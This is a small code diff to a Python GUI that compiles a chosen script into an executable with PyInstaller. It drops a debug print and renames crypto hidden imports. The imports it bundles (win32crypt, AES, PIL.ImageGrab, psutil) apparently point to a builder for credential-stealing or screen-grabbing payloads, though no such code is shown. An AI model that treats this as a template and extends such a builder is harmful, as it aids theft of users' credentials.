@@ -301,7 +301,6 @@ class App(customtkinter.CTk):
             self.browser.select()
 
     def check_icon(self):
-        print(self.fileopts.get())
         if self.fileopts.get() == "pyinstaller":
             self.icon.configure(state="normal")
         elif self.fileopts.get() == "cxfreeze":
@@ -434,7 +433,8 @@ class App(customtkinter.CTk):
                             "--hidden-import", "psutil",
                             "--hidden-import", "PIL",
                             "--hidden-import", "PIL.ImageGrab",
-                            "--hidden-import", "pycryptodome",
+                            "--hidden-import", "Crypto",
+                            "--hidden-import", "Crypto.Cipher.AES",
                             "--hidden-import", "win32crypt",
                             "--icon", exeicon, f"./{filename}.py"])
 
